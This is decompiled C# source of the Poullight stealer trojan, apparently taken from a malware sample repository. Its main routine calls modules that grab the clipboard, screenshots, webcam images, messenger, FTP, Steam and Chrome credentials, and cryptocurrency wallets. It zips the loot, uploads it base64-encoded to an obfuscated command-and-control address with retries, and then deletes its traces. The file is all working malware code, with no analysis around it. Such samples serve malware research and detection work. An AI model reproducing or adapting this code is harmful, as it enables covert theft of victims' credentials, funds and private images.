// Decompiled with JetBrains decompiler
// Type: XS
// Assembly: Poullight, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: A9555FC6-4E86-4D22-9A29-AD3955B2BC52
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\Trojan-PSW.MSIL.Poul.gen-67cfa95ccaa06c437e04f38c3ef890986c1885c61636b84bf51d16b0d7bf957c.exe

using EntryLoader;
using Poullight.Properties;
using System;
using System.Collections.Specialized;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Text;
using System.Threading;
using System.Windows.Forms;

internal class XS : Form
{
  public bool Start(string[] Params)
  {
    Information.Start();
    ProcList.Parse();
    Thread.Sleep(new Random().Next(1, 5) * 100);
    if (Base64.Decode(Params[2]) == "1")
      clipper.Start();
    Action method = (Action) (() => CBoard.Start());
    try
    {
      if (this.InvokeRequired)
        this.Invoke((Delegate) method);
      else
        method();
    }
    catch
    {
    }
    DesktopImg.Start();
    DFiles.Start();
    WebCam.Start();
    FZ.Start();
    Pidgin.Start();
    DS.Start();
    TG.Start();
    Skype.Start();
    Steam.Start();
    BTCQt.Start();
    BTCByte.Start();
    BTCDASH.Start();
    BTCETH.Start();
    BTCMON.Start();
    Thread.Sleep(new Random().Next(1, 5) * 1000);
    EGChromeC.Start();
    string str = string.Format("{0}{1}", (object) Buffer.path_ad, (object) GetRandom.String(Length: 8));
    if (System.IO.File.Exists(str))
      System.IO.File.Delete(str);
    ZipFile.CreateFromDirectory(Buffer.path_l, str);
    try
    {
      if (!EntryPoint.activation)
        Environment.FailFast("Program has been crashed");
      using (WebClient webClient = new WebClient())
      {
        NameValueCollection data = new NameValueCollection();
        data.Add("zipx", Base64.Encode(System.IO.File.ReadAllText(str, Encoding.GetEncoding(1251)), Encoding.GetEncoding(1251)));
        data.Add("desktop", Base64.Encode(System.IO.File.ReadAllText(string.Format("{0}ScreenShot.png", (object) Buffer.path_l), Encoding.GetEncoding(1251)), Encoding.GetEncoding(1251)));
        data.Add("webcam", Base64.Encode(System.IO.File.ReadAllText(string.Format("{0}WebCam.jpg", (object) Buffer.path_l), Encoding.GetEncoding(1251)), Encoding.GetEncoding(1251)));
        data.Add("email", Params[0]);
        data.Add("caption", Exporter.Export("<title>", "</title>", Starter.FileData));
        data.Add("username", Base64.Encode(Environment.UserName));
        data.Add("c_count", Base64.Encode(Buffer.XBufferData[0]));
        data.Add("pcount", Base64.Encode(Buffer.XBufferData[1]));
        data.Add("acount", Base64.Encode(Buffer.XBufferData[10]));
        data.Add("cd_count", Base64.Encode(Buffer.XBufferData[11]));
        data.Add("steam", Base64.Encode(Buffer.XBufferData[6]));
        data.Add("fzilla", Base64.Encode(Buffer.XBufferData[2]));
        data.Add("tg", Base64.Encode(Buffer.XBufferData[3]));
        data.Add("dcord", Base64.Encode(Buffer.XBufferData[4]));
        data.Add("skype", Base64.Encode(Buffer.XBufferData[5]));
        data.Add("b-core", Base64.Encode(Buffer.XBufferData[7]));
        data.Add("b-byte", Base64.Encode(Buffer.XBufferData[13]));
        data.Add("b-d", Base64.Encode(Buffer.XBufferData[14]));
        data.Add("b-ethe", Base64.Encode(Buffer.XBufferData[15]));
        data.Add("b-mon", Base64.Encode(Buffer.XBufferData[16]));
        data.Add("avinstall", Base64.Encode(Buffer.XBufferData[18]));
        data.Add("_version_", Base64.Encode("3200"));
        while (true)
        {
          try
          {
            if (Encoding.Default.GetString(webClient.UploadValues(string.Format(Resources.ResourceManager.GetString("connect"), (object) Base64.Decode(string.Format("{0}{1}{2}", (object) Buffer.Sender, (object) Buffer.Handler, (object) "="))), data)) == "good")
              break;
          }
          catch
          {
          }
          Thread.Sleep(2000);
        }
      }
    }
    catch
    {
    }
    try
    {
      Directory.Delete(Buffer.path_l, true);
    }
    catch
    {
    }
    try
    {
      System.IO.File.Delete(str);
    }
    catch
    {
    }
    return true;
  }
}
